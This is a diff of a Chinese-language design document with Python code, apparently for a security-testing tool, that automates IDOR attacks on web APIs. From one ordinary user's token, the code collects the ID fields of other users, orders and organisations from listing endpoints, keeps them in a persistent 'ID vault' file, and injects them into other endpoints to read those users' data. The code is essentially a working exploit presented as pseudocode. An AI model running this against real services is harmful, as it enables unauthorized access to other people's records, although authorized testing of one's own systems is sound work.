@@ -21,25 +21,31 @@
 - 测试必须在一个普通用户的 Token/Cookie 环境下进行。
 
 **步骤 2：信息收集与绑定 (Harvesting & ID Correlation)**
-- AI 构造 HTTP 请求向 Source 接口发包（如 `/api/v1/users/list`）。
-- **【关键改进】**：解析响应 JSON 数组时，**必须以 JSON 对象 (Object) 为单位提取 ID**，建立“绑定关系”。
-  - 错误做法：把所有的 `userid` 丢进一个池子，把所有的 `openid` 丢进另一个池子。
-  - 正确做法：从 `[{"userid": 1001, "openid": "wx_abc", "name": "..."}]` 中提取成对的字典 `{"userid": 1001, "openid": "wx_abc"}` 并缓存。这保证了在多参数碰撞时，不会出现“张三的 userid 搭配李四的 openid”导致后端校验失败。
+- AI 构造 HTTP 请求向 Source 接口发包（如 `/api/v1/users/list` 或 `/api/v1/orders/page`）。
+- **【核心机制：动态 ID 金库】**：解析响应 JSON 数组时，**绝不硬编码任何 ID 名称**。而是动态寻找所有以 `id` 结尾的字段（忽略大小写，如 `userId`, `openId`, `doc_id`, `orgId`）。
+- 只要这些字段出现在同一个 JSON Object 中，就认为它们是属于同一个实体的**强绑定关系**。
+- 将这些提取到的字典作为一行记录，追加写入到本地持久化文件（如 `id_vault.jsonl`）中。
+  - 示例 `id_vault.jsonl` 内容：
+    ```json
+    {"userId": "1001", "openId": "wx_abc", "orgId": "99"}
+    {"orderId": "505", "userId": "1001", "merchantId": "88"}
+    ```
 
 **步骤 3：参数碰撞与越权验证 (Collision & Validation)**
 - 遍历所有 Sink 接口。
-- 将步骤 2 收集到的 **绑定的 ID 字典** 完整注入。如果接口同时需要 `userid` 和 `openid`，则一并传入。
+- 读取 `id_vault.jsonl`。如果当前 Sink 接口需要传入 `[userId, orgId]`，引擎会遍历金库中的每一行，只要某一行同时拥有这两个键，就把对应的值取出来注入到请求中。
 
 ## 2. 核心 Fuzzer 伪代码 (Python)
 
 ```python
 import requests
 import json
-import re
+import os
 
 ATTACKER_TOKEN = "Bearer eyJhbG..."
-ATTACKER_ID = "1008"
+ATTACKER_ID = "1008" # 仅用于在入库时排除自己的数据
 BASE_URL = "http://target.com"
+VAULT_FILE = "id_vault.jsonl"
 
 with open("chain_graph.json", "r") as f:
     graph = json.load(f)
@@ -49,32 +55,36 @@ headers = {
     "Content-Type": "application/json"
 }
 
-# 用于存储绑定的 ID 对象集合
-# 格式: [{"userid": 1001, "openid": "wx_abc"}, {"orderid": 505, "userid": 1001}]
-bound_id_records = []
+# ==========================================
+# 阶段 1: 动态提取并持久化 ID 金库
+# ==========================================
+print("[*] Phase 1: Harvesting dynamic bound IDs into Vault...")
 
-# ==========================================
-# 阶段 1: 扫描 Sources 获取绑定的 ID 集合
-# ==========================================
-print("[*] Phase 1: Harvesting correlated IDs from Sources...")
+def save_to_vault(id_dict):
+    # 简单的去重逻辑，实际工程中可以使用 SQLite 或 set
+    with open(VAULT_FILE, "a") as vf:
+        vf.write(json.dumps(id_dict) + "\n")
+
+# 清空旧金库
+if os.path.exists(VAULT_FILE):
+    os.remove(VAULT_FILE)
+
 for source in graph["sources_for_leakage"]:
     try:
         if source["method"] == "GET":
             res = requests.get(BASE_URL + source["path"], headers=headers, timeout=5)
             
-            # 尝试解析 JSON 寻找对象数组
             try:
                 json_data = res.json()
-                # 简单递归查找所有的 list/array
                 def extract_objects(obj):
                     if isinstance(obj, list):
                         for item in obj:
                             if isinstance(item, dict):
-                                # 提取单个对象内的所有 ID 字段，保持绑定关系
+                                # 动态提取所有以 id 结尾的 key
                                 id_dict = {k: v for k, v in item.items() if str(k).lower().endswith('id')}
-                                if id_dict and id_dict.get('userid') != ATTACKER_ID: # 排除自己
-                                    if id_dict not in bound_id_records:
-                                        bound_id_records.append(id_dict)
+                                # 如果字典不为空，且不全是自己的 ID，则写入金库
+                                if id_dict and not all(str(v) == ATTACKER_ID for v in id_dict.values()):
+                                    save_to_vault(id_dict)
                             extract_objects(item)
                     elif isinstance(obj, dict):
                         for k, v in obj.items():
@@ -86,35 +96,41 @@ for source in graph["sources_for_leakage"]:
     except Exception as e:
         continue
 
-print(f"[+] Harvested {len(bound_id_records)} bound ID objects.")
+print(f"[+] Harvested ID rows saved to {VAULT_FILE}.")
 
 # ==========================================
-# 阶段 2: 针对 Sinks 进行成对的越权 Fuzzing
+# 阶段 2: 查阅金库并进行动态匹配 Fuzzing
 # ==========================================
-print("[*] Phase 2: Fuzzing Sinks with bound IDs...")
+print("[*] Phase 2: Fuzzing Sinks with Vault records...")
+
+# 将金库加载到内存
+vault_records = []
+if os.path.exists(VAULT_FILE):
+    with open(VAULT_FILE, "r") as vf:
+        for line in vf:
+            vault_records.append(json.loads(line.strip()))
+
 for sink in graph["sinks_for_exploitation"]:
     path = sink["path"]
     method = sink["method"]
-    req_ids = sink["required_ids"] # 例如 ["userid", "openid"]
+    req_ids = sink["required_ids"] # 动态读取需要的 key，例如 ["doc_id", "userId"]
     
-    # 筛选出同时包含该 Sink 所需所有 ID 的缓存记录
-    applicable_records = [rec for rec in bound_id_records if all(req_id in rec for req_id in req_ids)]
+    # 从金库中筛选出能满足该 Sink 全部必填 ID 的行
+    applicable_records = [rec for rec in vault_records if all(req_id in rec for req_id in req_ids)]
     
-    for record in applicable_records[:5]:  # 每个接口挑 5 组数据测试即可
-        # 构造攻击 URL，注入绑定的参数
+    for record in applicable_records[:5]:  # 每个接口挑 5 行数据测试
         target_url = BASE_URL + path
         if method == "GET":
-            # 拼接: ?userid=1001&openid=wx_abc
-            query_str = "&".join([f"{k}={v}" for k, v in record.items() if k in req_ids])
+            # 动态拼接: ?doc_id=xxx&userId=yyy
+            query_str = "&".join([f"{k}={record[k]}" for k in req_ids])
             target_url += f"?{query_str}"
             
             res = requests.get(target_url, headers=headers)
             
-            # 判断越权是否成功
             if res.status_code == 200 and str(record[req_ids[0]]) in res.text:
                 print(f"[!!!] VULNERABILITY FOUND (IDOR):")
                 print(f"      Endpoint: {target_url}")
-                print(f"      Payload: {record}")
+                print(f"      Payload from Vault: {record}")
                 print(f"      Leaked Info: {res.text[:100]}...")
 ```
 
